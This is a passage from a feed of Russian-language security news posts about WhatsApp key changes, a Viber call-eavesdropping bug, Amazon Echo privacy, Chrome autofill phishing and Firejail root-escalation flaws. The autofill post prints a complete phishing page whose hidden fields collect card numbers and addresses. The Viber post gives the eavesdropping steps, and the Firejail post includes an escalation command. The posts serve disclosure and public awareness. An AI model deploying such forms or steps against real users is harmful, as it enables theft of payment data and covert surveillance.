поздравление.\n\n![](https://meduza.io/image/attachments/images/001/788/144/small/2B9NpHOkbLpmrYqE1eyrTQ.png)\nЭкран с QR-кодом\n\nКак [установил](https://tobi.rocks/2016/04/whats-app-retransmission-vulnerability/) исследователь Тобиас Бёлтер, на деле, это не так. В апреле 2016 года, как только WhatsApp ввел сквозное шифрование, Бёлтер обнаружил: приложение без ведома пользователя может сменить ключ шифрования. Обычно ключ меняется, когда человек потерял телефон, сменил номер или надолго ушел в оффлайн.\n\nПо словам исследователя, эту особенность могут использовать злоумышленники, спецслужбы или сам WhatsApp. Возьмем тот же пример: Алиса отправила Бобу поздравление. Сообщение зашифровано ключом Боба, в этом Алиса уверена. Вдруг она видит, что сообщение не дошло, поскольку Боб не в сети. Вскоре Боб вернулся и прочитал поздравление. Ни Алиса, ни Боб не знают, что пока он был офлайн, WhatsApp сменил ключ шифрования. После смены ключа его, возможно, использует не Боб, а кто-то еще.\n\nДля пользователей WhatsApp такое поведение сервиса опасно. Злоумышленники могут атаковать сервис, создать новый ключ и получить сообщения вместо адресата. Еще хуже: по запросу спецслужб то же самое может сделать сам WhatsApp. Как утверждает Бёлтер, таким образом можно получить всю переписку, объявив предыдущие сообщения недоставленными.\n\nТобиас Бёлтер [сообщил об уязвимости в Facebook](https://tobi.rocks/pdf/whatsappslides.pdf) (соцсеть владеет этим мессенджером) еще в апреле 2016 года. 25 мая из социальной сети ответили, что так и задумано. Бёлтер в ответ написал, что так быть не должно. На это Facebook ответил: «Мы и раньше знали об этом. Пока мы менять ничего не собираемся». Как пишет The Guardian 13 января, ошибка все еще [на месте](https://www.theguardian.com/technology/2017/jan/13/whatsapp-backdoor-allows-snooping-on-encrypted-messages).\n\nВ настройках WhatsApp (Настройки → Учетная запись→ Безопасность) можно включить уведомления. Тогда приложение будет уведомлять, когда у собеседника сменился ключ шифрования. Это не защищает от описанной уязвимости: предупреждение появляется, когда сообщения, зашифрованные новым ключом, уже отправлены.\n\n![](https://meduza.io/image/attachments/images/001/788/148/small/UOPpMYaNsKUkmzGScDckGw.png)\n\nДля шифрования WhatsApp использует протокол Signal. Тот же протокол есть и в [одноименном мессенджере](https://whispersystems.org/), но приложения Signal ведут себя иначе. Когда ключ собеседника меняется, он не отправляет сообщения заново, а выдает предупреждение. По [версии](https://www.eff.org/node/82654) Фонда электронных рубежей, Signal — самый безопасный мессенджер среди популярных приложений. Он по умолчанию шифрует все сообщения так, что их не может прочитать никто, кроме адресата.\n\n[meduza](https://meduza.io/feature/2017/01/13/soobscheniya-v-whatsapp-mogut-prochitat-postoronnie-i-eto-ne-sobirayutsya-ispravlyat)"
		},
		{
			"post_id": 25,
			"title": "Уязвимость Viber, позволяющая прослушивать чужой разговор",
			"date_published": 1484251747.195,
			"body": "На возможность прослушивания чужих разговоров в Viber я наткнулся случайно еще в начале октября 2016 года. Уязвимость мне показалась не слишком приятной, поэтому я связался со службой поддержки и описал алгоритм для воспроизведения нестандартного поведения мессенджера.\n\nПишу данную публикацию в надежде привлечь внимание Хабрасообщества и ее более широкой огласке в надежде, что это побудит разработчиков исправить сей досадный баг, так как общение через электронную почту со службой поддержки Viber результатов не принесло.\n\n![](https://habrastorage.org/getpro/habr/post_images/63a/f9e/266/63af9e2666d84edf2694c2f13c4b5418.jpg)\n---\n**Исходные данные**\n\nДва абонента разговаривают между собой через Viber, назовем их А и Б. Во время разговора, абоненту А поступает вызов, но не через Viber, а через мобильную сеть. Абонент А отвечает на вызов, тем самым абонент Б оказывается на удержании.\n\n**Как подслушать разговор абонента A?**\n\nАбонент Б находясь на удержании, наживает на кнопку «Удержание» дважды, тем самым поставив и сняв режим удержания со своей стороны, данная опция доступна при разговоре по мобильному телефону или с планшета, в стационарном клиенте я такой кнопки не нашел.\n\nПроделав данные действия абонент Б слышит разговор абонента А, правда без возможности участвовать в нем. Абонент А никак не понимает, что его в этот момент уже «подслушивают» и когда заканчивает разговор по мобильной сети — возвращается в Viber для продолжения диалога с абонентом Б.\n\nДанная проблема воспроизводится на Android, проверить на iOS у меня нет возможности.\n\nДанная проблема была отправлена в поддержку Viber 4 октября 2016 года и получила номер #2620428. 22 ноября я напомнил им, что вышло уже 2 обновления Viber с момента отправки мной первого письма, но проблема не устранена.\n\nОтвет на второе письмо был получен лишь 28 ноября:\n\n>Мы искренне сожалеем, что Вы столкнулись с данной проблемой при >использовании Viber. В настоящий момент мы продолжаем работать над >расследованием данной проблемы. Как только будут получены результаты, >мы обязательно сообщим Вам об этом. Благодарим Вас за терпение.\n>\n>Best Regards, \n>Trinity L. \n>Viber Support Team \n>Quick question? Tweet to @ViberHelp\n\n~~На сегодняшний день проблема так и осталась на своём месте. Надеюсь, что данный пост поможет найти силы и средства к устранению данного бага.~~\n\nПока написал статью, проблему исправили в обновлении пришедшем вчера на телефон, но она может все еще актуальна для не обновившихся\n\n*UPD:* из сообщений в комментариях, стало ясно, что проблема до сих пор не исправлена для [iOS](https://habrahabr.ru/post/319360/#comment_10008092) и [BlackBerry](https://habrahabr.ru/post/319360/#comment_10009014).\n\n[хабр](https://habrahabr.ru/post/319360/)"
		},
		{
			"post_id": 24,
			"title": "Кажется Facebook публично заявил, что читает всю переписку пользователей WhatsApp. Занятная статистика от fb:\n\nПользователи WhatsApp отправили 63 миллиарда сообщений в канун Нового года",
			"date_published": 1484170982.541,
			"body": "Не секрет, что в период новогодних праздников люди отправляют больше текстовых сообщений, чем обычно. Facebook раскрыла статистику использования WhatsApp накануне Нового года. В это время пользователи отправили через мессенджер около 63 миллиардов сообщений. Интересно, что 14 миллиардов приходятся на Индию, 8 миллиардов сопровождались изображениями, а в 2,5 миллиарда во вложениях были видеоролики. Таким образом, через серверы компании прошло не только большое количество обычных сообщений, но и достаточно мультимедийного контента.\nWhatsApp\n\n![](http://s.4pda.to/LAIsIa0jZjVUz1DqyByFqmyFvssAexr.jpg)\n\nНапомним, Facebook владеет двумя наиболее распространёнными кроссплатформенными мессенджерами: WhatsApp и Facebook Messenger. В апреле прошлого года компания заявила, что через два этих сервиса ежедневно проходило более 60 миллиардов сообщений, а в феврале 2016 серверы WhatsApp обрабатывали около 42 миллиардов сообщений каждый день. \n\n[4pda](http://4pda.ru/2017/01/10/333296/)\n[ubergizmo](http://www.ubergizmo.com/2017/01/63-billion-whatsapp-messages-new-years-eve/)"
		},
		{
			"post_id": 23,
			"title": "Прослушка по доброй воле: чем опасны «умные» электронные помощники?",
			"date_published": 1484170281.82,
			"body": "Убийство американца Виктора Колинза, найденного чуть больше года назад задушенным и сейчас обсуждаемое даже за пределами США, никогда не привлекло бы такого внимания, если бы не одно обстоятельство. Главным свидетелем по делу оказался электронный соглядатай! Интеллектуальный помощник Amazon Echo, роль которого в этой истории может оказаться судьбоносной, но которая также подчеркнула происходящие сейчас технические перемены в быту — перемены настолько значительные, что (по крайней мере в США) ими уже озаботились несколько федеральных ведомств. \n---\nСама история гибели Колинза выглядит типичной «бытовухой». Ноябрьским утром 2015-го года тело Виктора со следами удушения было найдено плавающим в джакузи в доме его друга, Джеймса Бейтса. Тот, естественно, заявил о своей невиновности и добиться за год от него так ничего и не удалось. Но внезапно помогла его, Бейтса, страсть к современной электронике. Он, видите ли, любитель [«умных» вещей](http://gosvopros.ru/territory/khozyaystvo/smart/). У него установлены хитрая система сигнализации, «умные» выключатели света, «умный» счётчик воды и тому подобные новомодные штуки. Полиция уже затребовала данные, накопленные этими устройствами — и, например, счётчик воды зафиксировал в тот день рекордный расход, что позволило предположить, что хозяин заметал следы конфликта. Однако главную роль сыграл Echo.\n\nEcho часто называют роботом, но вообще эта вещица больше похожа на обыкновенную вазу. Внутри спрятан компьютер, постоянно подключенный к интернету и умеющий распознавать человеческий голос. Echo слушает, что говорят вокруг, но ничего не предпринимает, пока не услышит кодовое слово. Тогда он начинает анализировать сказанное человеком и пытается выполнить то, что от него просят: так он воспроизводит музыку, ищет ответы на вопросы, делает покупки в интернет-магазинах, цитирует анекдоты и т.п. На рынке это устройство уже третий год и за это время стало бестселлером, продавшись миллионами экземпляров. Есть, конечно, и аналоги (например, Google Home, а также «помощники» в смартфонах: Siri, Cortana и другие), но именно Echo пока остаётся самым популярным продуктом в своём классе.\n\n![](http://gosvopros.ru/upload/authors/Sentinel/december16/110117-1.jpg)\n\nТакой вот он, Amazon Echo: скучный, серый. Но особенно дети от него в восторге. А как же: эта металлическая ваза знает всё!\nОстановитесь на секунду, задумайтесь: миллионы людей (пока в основном американцев) добровольно ставят себе в дом подслушивающее устройство! Echo, правда, не записывает всё подряд, но то, что было произнесено после кодового слова, в том числе и фоновые шумы (речь рядом находящихся людей, звук телевизора и т.п.), сохраняется не просто в память устройства, а передаётся на компьютеры компании Amazon, где хранится годами!\n\nПользователю позволено просматривать коллекцию собранного на него «компромата», но как именно её использует Amazon и для чего и как долго хранит — вопросы, на которые пока нет ответов. Так уж заведено у современных интернет-компаний: они собирают любую информацию о своих клиентах, подшивают её к персональному «досье», и хранят бессрочно, в надежде, что однажды пригодится. \n\nИ чего удивляться, что сторона обвинения в деле Колинза-Бейтса потребовала от Amazon предоставить записи, сделанные бейтсовским Echo? По командам и шумам обвинители надеются восстановить картину происходившего в ту ночь в доме. Дело было замечено средствами массовой информации, возник общественный резонанс. И стали всплывать интереснейшие вещи!\n\nПрежде всего оказалось, что почти никто из покупателей Echo и ему подобных продуктов не интересуется, как именно такие устройства работают. Люди предполагают, что «умная железка» сразу же забывает всё, что услышала. Представляете, каково им будет узнать, что каждая поданная команда подшивается к «личному архиву»? \n\nРазумно предположить, что такой архив должен квалифицироваться законом как личная или семейная тайна и, поскольку право гражданина на неё гарантировано конституцией, вроде бы можно не беспокоиться, что собранная информация будет предоставлена правоохранительным органам или, не дай бог, продана третьей стороне. Но и это заблуждение! Когда вопрос проанализировали юристы, оказалось, что записи, сделанные Echo, считаться тайной не могут!\n\nЭлектронный помощник — не личный дневник и уж тем более не семейный адвокат и не доктор: покупая устройство, гражданин фактически заключает договор с обслуживающей его компанией (в данном случае с Amazon) на оказание информационных услуг. Поэтому информация, которую компания собирает, оказывается просто «расходным материалом»: законом она не защищена, может быть предоставлена как минимум полиции, использована в качестве улики в судебных слушаниях и т.п. Amazon, правда, пока упирается, но к весеннему заседанию суда записи бейтсовского Echo скорее всего будут предоставлены.\n\n![](http://gosvopros.ru/upload/authors/Sentinel/december16/110117-2.jpg)\n\n«Умные» вещи таят в себе риск, хорошо показанный на этой иллюстрации: даже самая привычная вещица, став «умной», начнёт собирать и передавать информацию о хозяине...\nГлобальная же проблема в том, что технология распознавания голоса сделала за последние годы слишком большие успехи! И теперь Echo и ему подобные «помощники» обещают стать одним из самых популярных электронных устройств, чуть ли не новым домашним информационным центром, проникнув в каждую квартиру и каждый дом. Кроме того, функцию приёма голосовых команд скорее всего встроят и в другие «умные» вещи, начиная от холодильников и заканчивая лампочками — и они, естественно, тоже станут подслушивать хозяев постоянно.\n\nНичего удивительного, что в Соединённых Штатах федеральные регуляторы уже бьют тревогу. Как минимум сотрудники Федеральной торговой комиссии (защита прав потребителей, надзор за монополиями) и Министерства внутренней безопасности (аналог наших ФСБ, МВД) прорабатывают сейчас варианты предотвращения расползания проблемы — в том числе в сотрудничестве с производителями. Идея в том, чтобы поставить информационную безопасность во главу угла уже при проектировании таких устройств, а также донести до покупателей понимание риска, который они берут на себя, пользуясь Echo или ему подобными. Ведь собираемые ими данные интересны не только правоохранительным органам, не только компаниям, но и например злоумышленникам всех сортов! Которые, естественно, действуют без судебного ордера и вообще без предупреждения или спросу.\n\nПоскольку интеллектуальные помощники начали проникать и в Россию, нам тоже будет разумно донести до потребителей простые три правила пользования ими. Во-первых, не покупать устройства от малоизвестных производителей (наверняка китайские безымянные фирмочки наладят выпуск подобных продуктов). Во-вторых, защищать их надёжными паролями. В-третьих, не лениться регулярно обновлять программное обеспечение, если такая возможность предусмотрена. \n\nДа, это потребует усилий, но стоит помнить, что при неправильной эксплуатации «умный» электронный помощник способен навредить не только хозяину, а и близким людям. И если покупатель не готов о нём заботиться, если не понимает рисков, лучше такую вещь не заводить вовсе.\n\n[источник](http://gosvopros.ru/territory/razbitye-okna/echo/)"
		},
		{
			"post_id": 22,
			"title": "Фишинг через автозаполнение в Chrome (демо)",
			"date_published": 1484082962.359,
			"body": "![](https://habrastorage.org/getpro/geektimes/post_images/f16/171/987/f16171987ad3eaaf04e96639f8437def.png)\n\n[Давно](https://yoast.com/autocomplete-security/) известно, что функция автозаполнения в браузере — отличный вектор атаки. Браузер с легкостью отдает любому желающему сохраненную информацию для заполнения в форм, даже если этих форм не видно. А среди сохраненной информации в профиле автозаполнения могут быть и конфиденциальные данные. Например, домашний адрес пользователя или даже данные банковской карточки. Человек не всегда хочет делиться такой информацией, вводя просто адрес электронной почты в каком-нибудь списке рассылки. А придется поделиться, если у него браузер Chrome (в Firefox фичу обещают реализовать в ближайшее время, но пока не работает).\n---\nВ браузере эта функция работает таким образом: при вводе одного из полей в большой форме профиль предлагает заполнить это поле и другие поля автоматически. Если пользователь соглашается, то поля заполняются и помечаются при этом желтым цветом.\n\nДля большинства пользователей автозаполнение — удобная функция, которая позволяет экономить время, чтобы не заполнять вручную 10, 20 или больше полей. Мало кто из них задумывается, что передавая на сторону серверу всего лишь одно поле для автозаполнения он автоматически соглашается передать и все остальные. Но так оно и есть.\n\nФинский веб-разработчик Вильями Куосманен (Viljami Kuosmanen) написал простую [демку](https://anttiviljami.github.io/browser-autofill-phishing/), которая наглядно демонстрирует, как происходит фишинг через автозаполнение. \n\nЭта демка представляет собой простую страничку всего с двумя полями: имя и адрес электронной почты. Как обычно, вы начинаете заполнять имя, появляются варианты профилей автозаполнения — вы выбираете автозаполнение. После этого автоматически заполняются оба поля: и имя, и адрес электронной почты. Как и положено, они помечаются желтым цветом.\n\nДалее нажимаете кнопку \"Submit\" — и наблюдаете весь набор данных из профиля автозаполнения, которые браузер передал удаленному хосту. Впечатляет.\n\n![](https://habrastorage.org/files/681/1fb/9d9/6811fb9d98e44e13898030bf95213908.gif)\n\nФишинг лучше всего работает в браузере Google Chrome. Там передача информации происходит совершенно незаметно для пользователя. В браузере Safari пользователь все-таки увидит, какая лишняя информация отправляется хосту. В Firefox пользователю нужно вручную нажимать правой кнопкой мыши по каждому полю, которое он хочет автоматически заполнить. Таким образом, фишинг вообще не сработает. Возможно, разработчики Firefox решили пожертвовать удобством пользователей ради дополнительной безопасности при активации профилей автозаполнения. Может быть, и зря. История показывает, что при выборе между удобством и безопасностью большинство пользователей часто выбирают удобство.\n\nВозможно и то, что разработчики Firefox просто еще не закончили разработку такой удобной функции как профили автозаполнения, но в будущем [обязательно реализуют ее по образцу Chrome](https://bugzilla.mozilla.org/show_bug.cgi?id=990176).\n\nВ браузере Opera, судя по всему, профили автозаполнения передают информацию незаметно для пользователя точно так же, как и в Chrome.\n\nИсходный код [опубликован](https://github.com/anttiviljami/browser-autofill-phishing/) на Github, так что при желании вы можете внедрить такую демку на своем сайте. Сейчас энтузиасты вносят в код маленькие изменения, но пока что фишинговая форма выглядит следующим образом:\n\nindex.html\n~~~~\n<!doctype html>\n<html>\n  <head>\n    <title>Browser Autofill Phishing</title>\n  </head>\n  <body>\n    <form action=\"https://httpbin.org/post\" method=\"post\">\n      <p>\n        <label for=\"name\">Name</label><br>\n        <input id=\"name\" name=\"name\" type=\"text\" placeholder=\"Your Name\">\n      </p>\n      <p>\n        <label for=\"email\">Email</label><br>\n        <input id=\"email\" name=\"email\" type=\"email\" placeholder=\"Your Email\">\n      </p>\n      <p>\n        <input type=\"submit\" value=\"Submit\">\n      </p>\n      <p style=\"margin-left:-500px\">\n        <input id=\"phone\" name=\"phone\" type=\"text\" placeholder=\"Your Phone\">\n      </p>\n      <p style=\"margin-left:-500px\">\n        <input id=\"organization\" name=\"organization\" type=\"text\" placeholder=\"Your Organization\">\n      </p>\n      <p style=\"margin-left:-500px\">\n        <input id=\"address\" name=\"address\" type=\"text\" placeholder=\"Your Address\">\n      </p>\n      <p style=\"margin-left:-500px\">\n        <input id=\"postal\" name=\"postal\" type=\"text\" placeholder=\"Your Postal Code\">\n      </p>\n      <p style=\"margin-left:-500px\">\n        <input id=\"city\" name=\"city\" type=\"text\" placeholder=\"Your City\">\n      </p>\n      <p style=\"margin-left:-500px\">\n        <select name=\"country\"><option value=\"\"></option><option value=\"FI\">Finland</option><option value=\"AF\">Afghanistan</option><option value=\"AX\">Åland Islands</option><option value=\"AL\">Albania</option><option value=\"DZ\">Algeria</option><option value=\"AS\">American Samoa</option><option value=\"AD\">Andorra</option><option value=\"AO\">Angola</option><option value=\"AI\">Anguilla</option><option value=\"AQ\">Antarctica</option><option value=\"AG\">Antigua & Barbuda</option><option value=\"AR\">Argentina</option><option value=\"AM\">Armenia</option><option value=\"AW\">Aruba</option><option value=\"AC\">Ascension Island</option><option value=\"AU\">Australia</option><option value=\"AT\">Austria</option><option value=\"AZ\">Azerbaijan</option><option value=\"BS\">Bahamas</option><option value=\"BH\">Bahrain</option><option value=\"BD\">Bangladesh</option><option value=\"BB\">Barbados</option><option value=\"BY\">Belarus</option><option value=\"BE\">Belgium</option><option value=\"BZ\">Belize</option><option value=\"BJ\">Benin</option><option value=\"BM\">Bermuda</option><option value=\"BT\">Bhutan</option><option value=\"BO\">Bolivia</option><option value=\"BA\">Bosnia & Herzegovina</option><option value=\"BW\">Botswana</option><option value=\"BV\">Bouvet Island</option><option value=\"BR\">Brazil</option><option value=\"IO\">British Indian Ocean Territory</option><option value=\"VG\">British Virgin Islands</option><option value=\"BN\">Brunei</option><option value=\"BG\">Bulgaria</option><option value=\"BF\">Burkina Faso</option><option value=\"BI\">Burundi</option><option value=\"KH\">Cambodia</option><option value=\"CM\">Cameroon</option><option value=\"CA\">Canada</option><option value=\"CV\">Cape Verde</option><option value=\"BQ\">Caribbean Netherlands</option><option value=\"KY\">Cayman Islands</option><option value=\"CF\">Central African Republic</option><option value=\"TD\">Chad</option><option value=\"CL\">Chile</option><option value=\"CN\">China</option><option value=\"CX\">Christmas Island</option><option value=\"CC\">Cocos [Keeling] Islands</option><option value=\"CO\">Colombia</option><option value=\"KM\">Comoros</option><option value=\"CD\">Congo [DRC]</option><option value=\"CG\">Congo [Republic]</option><option value=\"CK\">Cook Islands</option><option value=\"CR\">Costa Rica</option><option value=\"CI\">Côte d’Ivoire</option><option value=\"HR\">Croatia</option><option value=\"CW\">Curaçao</option><option value=\"CY\">Cyprus</option><option value=\"CZ\">Czech Republic</option><option value=\"DK\">Denmark</option><option value=\"DJ\">Djibouti</option><option value=\"DM\">Dominica</option><option value=\"DO\">Dominican Republic</option><option value=\"EC\">Ecuador</option><option value=\"EG\">Egypt</option><option value=\"SV\">El Salvador</option><option value=\"GQ\">Equatorial Guinea</option><option value=\"ER\">Eritrea</option><option value=\"EE\">Estonia</option><option value=\"ET\">Ethiopia</option><option value=\"FK\">Falkland Islands [Islas Malvinas]</option><option value=\"FO\">Faroe Islands</option><option value=\"FJ\">Fiji</option><option value=\"FI\">Finland</option><option value=\"FR\">France</option><option value=\"GF\">French Guiana</option><option value=\"PF\">French Polynesia</option><option value=\"TF\">French Southern Territories</option><option value=\"GA\">Gabon</option><option value=\"GM\">Gambia</option><option value=\"GE\">Georgia</option><option value=\"DE\">Germany</option><option value=\"GH\">Ghana</option><option value=\"GI\">Gibraltar</option><option value=\"GR\">Greece</option><option value=\"GL\">Greenland</option><option value=\"GD\">Grenada</option><option value=\"GP\">Guadeloupe</option><option value=\"GU\">Guam</option><option value=\"GT\">Guatemala</option><option value=\"GG\">Guernsey</option><option value=\"GN\">Guinea</option><option value=\"GW\">Guinea-Bissau</option><option value=\"GY\">Guyana</option><option value=\"HT\">Haiti</option><option value=\"HM\">Heard & McDonald Islands</option><option value=\"HN\">Honduras</option><option value=\"HK\">Hong Kong</option><option value=\"HU\">Hungary</option><option value=\"IS\">Iceland</option><option value=\"IN\">India</option><option value=\"ID\">Indonesia</option><option value=\"IR\">Iran</option><option value=\"IQ\">Iraq</option><option value=\"IE\">Ireland</option><option value=\"IM\">Isle of Man</option><option value=\"IL\">Israel</option><option value=\"IT\">Italy</option><option value=\"JM\">Jamaica</option><option value=\"JP\">Japan</option><option value=\"JE\">Jersey</option><option value=\"JO\">Jordan</option><option value=\"KZ\">Kazakhstan</option><option value=\"KE\">Kenya</option><option value=\"KI\">Kiribati</option><option value=\"XK\">Kosovo</option><option value=\"KW\">Kuwait</option><option value=\"KG\">Kyrgyzstan</option><option value=\"LA\">Laos</option><option value=\"LV\">Latvia</option><option value=\"LB\">Lebanon</option><option value=\"LS\">Lesotho</option><option value=\"LR\">Liberia</option><option value=\"LY\">Libya</option><option value=\"LI\">Liechtenstein</option><option value=\"LT\">Lithuania</option><option value=\"LU\">Luxembourg</option><option value=\"MO\">Macau</option><option value=\"MK\">Macedonia [FYROM]</option><option value=\"MG\">Madagascar</option><option value=\"MW\">Malawi</option><option value=\"MY\">Malaysia</option><option value=\"MV\">Maldives</option><option value=\"ML\">Mali</option><option value=\"MT\">Malta</option><option value=\"MH\">Marshall Islands</option><option value=\"MQ\">Martinique</option><option value=\"MR\">Mauritania</option><option value=\"MU\">Mauritius</option><option value=\"YT\">Mayotte</option><option value=\"MX\">Mexico</option><option value=\"FM\">Micronesia</option><option value=\"MD\">Moldova</option><option value=\"MC\">Monaco</option><option value=\"MN\">Mongolia</option><option value=\"ME\">Montenegro</option><option value=\"MS\">Montserrat</option><option value=\"MA\">Morocco</option><option value=\"MZ\">Mozambique</option><option value=\"MM\">Myanmar [Burma]</option><option value=\"NA\">Namibia</option><option value=\"NR\">Nauru</option><option value=\"NP\">Nepal</option><option value=\"NL\">Netherlands</option><option value=\"NC\">New Caledonia</option><option value=\"NZ\">New Zealand</option><option value=\"NI\">Nicaragua</option><option value=\"NE\">Niger</option><option value=\"NG\">Nigeria</option><option value=\"NU\">Niue</option><option value=\"NF\">Norfolk Island</option><option value=\"MP\">Northern Mariana Islands</option><option value=\"NO\">Norway</option><option value=\"OM\">Oman</option><option value=\"PK\">Pakistan</option><option value=\"PW\">Palau</option><option value=\"PS\">Palestine</option><option value=\"PA\">Panama</option><option value=\"PG\">Papua New Guinea</option><option value=\"PY\">Paraguay</option><option value=\"PE\">Peru</option><option value=\"PH\">Philippines</option><option value=\"PN\">Pitcairn Islands</option><option value=\"PL\">Poland</option><option value=\"PT\">Portugal</option><option value=\"PR\">Puerto Rico</option><option value=\"QA\">Qatar</option><option value=\"RE\">Réunion</option><option value=\"RO\">Romania</option><option value=\"RU\">Russia</option><option value=\"RW\">Rwanda</option><option value=\"WS\">Samoa</option><option value=\"SM\">San Marino</option><option value=\"ST\">São Tomé & Príncipe</option><option value=\"SA\">Saudi Arabia</option><option value=\"SN\">Senegal</option><option value=\"RS\">Serbia</option><option value=\"SC\">Seychelles</option><option value=\"SL\">Sierra Leone</option><option value=\"SG\">Singapore</option><option value=\"SX\">Sint Maarten</option><option value=\"SK\">Slovakia</option><option value=\"SI\">Slovenia</option><option value=\"SB\">Solomon Islands</option><option value=\"SO\">Somalia</option><option value=\"ZA\">South Africa</option><option value=\"GS\">South Georgia & South Sandwich Islands</option><option value=\"KR\">South Korea</option><option value=\"SS\">South Sudan</option><option value=\"ES\">Spain</option><option value=\"LK\">Sri Lanka</option><option value=\"BL\">St. Barthélemy</option><option value=\"SH\">St. Helena</option><option value=\"KN\">St. Kitts & Nevis</option><option value=\"LC\">St. Lucia</option><option value=\"MF\">St. Martin</option><option value=\"PM\">St. Pierre & Miquelon</option><option value=\"VC\">St. Vincent & Grenadines</option><option value=\"SR\">Suriname</option><option value=\"SJ\">Svalbard & Jan Mayen</option><option value=\"SZ\">Swaziland</option><option value=\"SE\">Sweden</option><option value=\"CH\">Switzerland</option><option value=\"TW\">Taiwan</option><option value=\"TJ\">Tajikistan</option><option value=\"TZ\">Tanzania</option><option value=\"TH\">Thailand</option><option value=\"TL\">Timor-Leste</option><option value=\"TG\">Togo</option><option value=\"TK\">Tokelau</option><option value=\"TO\">Tonga</option><option value=\"TT\">Trinidad & Tobago</option><option value=\"TA\">Tristan da Cunha</option><option value=\"TN\">Tunisia</option><option value=\"TR\">Turkey</option><option value=\"TM\">Turkmenistan</option><option value=\"TC\">Turks & Caicos Islands</option><option value=\"TV\">Tuvalu</option><option value=\"UM\">U.S. Outlying Islands</option><option value=\"VI\">U.S. Virgin Islands</option><option value=\"UG\">Uganda</option><option value=\"UA\">Ukraine</option><option value=\"AE\">United Arab Emirates</option><option value=\"GB\">United Kingdom</option><option value=\"US\">United States</option><option value=\"UY\">Uruguay</option><option value=\"UZ\">Uzbekistan</option><option value=\"VU\">Vanuatu</option><option value=\"VA\">Vatican City</option><option value=\"VE\">Venezuela</option><option value=\"VN\">Vietnam</option><option value=\"WF\">Wallis & Futuna</option><option value=\"EH\">Western Sahara</option><option value=\"YE\">Yemen</option><option value=\"ZM\">Zambia</option><option value=\"ZW\">Zimbabwe</option></select>\n      </p>\n      <p style=\"margin-left:-500px\">\n        <input type=\"text\" name=\"cc_number\">\n      </p>\n      <p style=\"margin-left:-500px\">\n        <select name=\"cc_month\" id=\"cc_month\"> <option value=\"01\">01</option><option value=\"02\">02</option><option value=\"03\">03</option><option value=\"04\">04</option><option value=\"05\">05</option><option value=\"06\">06</option><option value=\"07\">07</option><option value=\"08\">08</option><option value=\"09\">09</option><option va----lue=\"10\">10</option><option value=\"11\">11</option><option value=\"12\">12</option></select>\n\n        <select name=\"cc_year\" id=\"cc_year\"> <option>2017</option><option>2018</option><option>2019</option><option>2020</option><option>2021</option><option>2022</option><option>2023</option><option>2024</option><option>2025</option><option>2026</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option><option>2031</option><option>2032</option></select>\n      </p>\n      <p style=\"margin-left:-500px\">\n        <input type=\"text\" id=\"cc_cvv\" name=\"cc_cvv\">\n      </p>\n    </form>\n    <script type=\"text/javascript\">\n      function onchangehandler(event) {\n        // Print out its value. Could be a web request without users' knowledge.\n        console.log(event.target.name + \": \" + event.target.value);\n      }\n      // Apply 'input' event to every input element\n      document.querySelectorAll('input').forEach(function(input) { input.addEventListener('input', onchangehandler); } );\n    </script>\n  </body>\n</html>\n~~~~\n\nИз исходного кода страницы index.html сразу понятно, что на ней спрятаны еще с десяток полей для ввода данных, но все они отформатированы с атрибутом \"margin-left:-500px\": там телефон, место работы, адрес, почтовый индекс, город, страна, месяц и год окончания действия кредитной карты, номер кредитной карты.\n\nПользователь их не видит из-за \"margin-left:-500px\", а браузер спокойно заполняет каждое поле — и передает данные.\n\nКак несложно понять, такую атаку легко провести, чтобы узнать номер кредитной карточки пользователя Chrome и другие данные о нем, если только он активирует функцию автозаполнения на вашей странице.\n\nВозможно, атака работает не только в Chrome, но и в других браузерах на его кодовой базе. Например, в «Яндекс.Браузере». Этот браузер раньше вообще [сливал кому угодно данные для синхронизации](https://www.netsparker.com/blog/web-security/csrf-vulnerability-yandex-browser/) через простой CSRF-баг. Там не только информация для автозаполнения форм, но и пароли, закладки, история браузера и т.д. По сравнению с тем багом фишинг через автозаполнение в Chrome — это так, детская шалость. Уязвимость была устранена только в мае 2016 года.\n\nВообще, специалисты давно предупреждали об опасности использования профилей автозаполнения. Предупреждения прозвучали буквально сразу после того как эта функция появилась в браузере Chrome в 2013 году. С тех пор разработчики браузера так и не сумели реализовать грамотную защиту от автозаполнения скрытых полей.\n\nКстати, похожий трюк с заполнением невидимых форм давно используется для выявления ботов. Нормальные пользователи не заполняют поля, смещенные за пределы видимой области экрана, а боты — заполняют. Финский программист Вильями Куосманен просто применил тот же не трюк, но не против ботов, а против людей.\n\nЧтобы уберечься от передачи нежелательных данных, достаточно просто отключить профили автозаполнения в браузере (функция включена по умолчанию).\n\n[geektimes](https://geektimes.ru/post/284418/)"
		},
		{
			"post_id": 21,
			"title": "Cистемная плата на микропроцессоре Эльбрус-8С. Обзор на youtube.com",
			"date_published": 1483882169.332,
			"body": "<iframe width=\"854\" height=\"480\" src=\"https://www.youtube.com/embed/PgA9z6LOVZU\" frameborder=\"0\" allowfullscreen></iframe>"
		},
		{
			"post_id": 20,
			"title": "Серия уязвимостей в Firejail",
			"date_published": 1483880651.022,
			"body": "В системе для изолированного выполнения приложений [Firejail](https://firejail.wordpress.com/) выявлено девять уязвимостей, большинство из которых позволяют повысить свои привилегии в основной системе до пользователя root. Firejail [использует](https://www.opennet.ru/opennews/art.shtml?num=45120) для изоляции механизм пространств имён (namespaces), AppArmor и фильтрацию системных вызовов (seccomp-bpf) в Linux, но для настройки изолированного запуска требует повышенных привилегий, которые получает через привязку к утилите флага suid root или запуск при помощи sudo. Как оказалось безопасность Firejail находится в весьма печальном состоянии и многие опции и пользовательские данные обрабатываются под euid 0.\n---\nПервой была [опубликована](http://openwall.com/lists/oss-security/2017/01/04/1) информация об уязвимости CVE-2017-5180, найденной участниками SuSE Security Team и использующей манипуляцию с файлом /etc/ld.so.preload для запуска своего кода с правами root. Следом было [выявлено](http://openwall.com/lists/oss-security/2017/01/05/4) ещё шесть уязвимостей, позволяющих совершить атаку через манипуляцию с tmpfs (CVE-2016-10117, CVE-2016-10119), переписать /etc/resolv.conf (CVE-2016-10118), получить полный доступ к системным файлам из-за монтирования /dev, /dev/shm, /var/tmp и /var/lock в режиме 0777 (CVE-2016-10120, CVE-2016-10121) и выполнить код с правами root из-за неочистки переменных окружения (CVE-2016-10122) и из-за возможности использования режима \"--chroot\" без seccomp (CVE-2016-10123).\n\nНапример, firejail позволяет непривилегированному пользователю примонтировать tmpfs-раздел для любой директории, в том числе прикрепить свой tmpfs-раздел вместо /etc - \"firejail --noprofile --tmpfs=/etc\". Или можно загрузить с правами root стороннюю библиотеку из-за неочистки переменной окружения LD_PRELOAD при запуске программ в режиме x11 